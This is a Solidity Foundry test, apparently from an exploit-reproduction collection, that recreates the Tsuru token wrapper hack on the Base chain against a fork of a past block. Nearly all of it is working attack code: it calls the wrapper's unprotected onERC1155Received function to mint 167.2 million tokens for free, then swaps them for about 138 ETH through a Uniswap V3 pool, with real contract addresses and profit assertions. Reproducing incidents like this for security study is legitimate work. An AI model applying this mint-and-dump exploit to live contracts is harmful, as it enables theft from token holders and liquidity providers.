// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./../interface.sol";

import "../basetest.sol";
// @KeyInfo - Total Lost : 140K
// Attacker :https://basescan.org/address/0x7A5Eb99C993f4C075c222F9327AbC7426cFaE386
// Attack Contract :https://basescan.org/address/0xa2209b48506c4e7f3a879ec1c1c2c4ee16c2c017
// Vulnerable Contract :https://basescan.org/address/0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA
// Attack Tx :https://basescan.org/tx/0xe63a8df8759f41937432cd34c590d85af61b3343cf438796c6ed2c8f5b906f62

// @Info
// Vulnerable Contract Code :https://basescan.org/address/0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA#code

// @Analysis
// Post-mortem : https://base.tsuru.wtf/usdtsuru-exploit-incident-report
// Twitter Guy : https://x.com/shoucccc/status/1788941548929110416
// Hacking God : https://x.com/SlowMist_Team/status/1788936928634834958

pragma solidity ^0.8.0;
interface IWrapper is IERC20 {
    function onERC1155Received(address, address from, uint256 id, uint256 amount, bytes calldata) external;
}

// Uniswap V3 Pool Interface
interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract TsuruExploit is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 14_279_784;

    //Uniswapv3 constants
    uint160 internal constant MIN_SQRT_RATIO = 4_295_128_739;
    uint160 internal constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;
    address UNISWAP_V3_POOL = 0x913b1658dd001dFF93D3AF2A657523F1eed53917;

    //The vulernable contract
    address tsuruwrapper = 0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA;
    address weth = 0x4200000000000000000000000000000000000006;

    //Expected profits
    uint256 expectedTokens = 167_200_000 ether;
    uint256 expectedETH = 137.904209005799603676 ether;

    IWrapper wrapper = IWrapper(tsuruwrapper);

    function setUp() public {
        vm.createSelectFork("Base", blocknumToForkFrom);
        fundingToken = weth;
    }

    function testExploit() public balanceLog {
        //First mint tokens with vulerable on onERC1155Received function
        wrapper.onERC1155Received(address(0), address(this), 0, 418, new bytes(0));
        assertEq(wrapper.balanceOf(address(this)), expectedTokens, "Not enough tokens");

        //Swap the tokens to ETH via UniV3 pool
        _v3Swap(tsuruwrapper, weth, expectedTokens, address(this));
        assertEq(getFundingBal(), expectedETH, "Not enough ETH");
    }

    function _v3Swap(address tokenIn, address tokenOut, uint256 amount, address destTo) internal {
        if (amount == 0) {
            return;
        }
        bool zeroForOne = tokenIn < tokenOut;
        uint160 sqrt = zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1;
        IUniswapV3Pool(UNISWAP_V3_POOL).swap(
            destTo, zeroForOne, int256(amount), sqrt, zeroForOne ? bytes("1") : bytes("")
        );
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        require(msg.sender == address(UNISWAP_V3_POOL), "Invalid caller");
        bool zeroForOne = data.length > 0;
        address tokenOut = zeroForOne
            ? IUniswapV3Pool(UNISWAP_V3_POOL).token0()
            : IUniswapV3Pool(UNISWAP_V3_POOL).token0() == weth ? tsuruwrapper : weth;

        uint256 amountOut = uint256(zeroForOne ? amount0Delta : amount1Delta);

        IERC20(tokenOut).transfer(msg.sender, amountOut);
    }
}
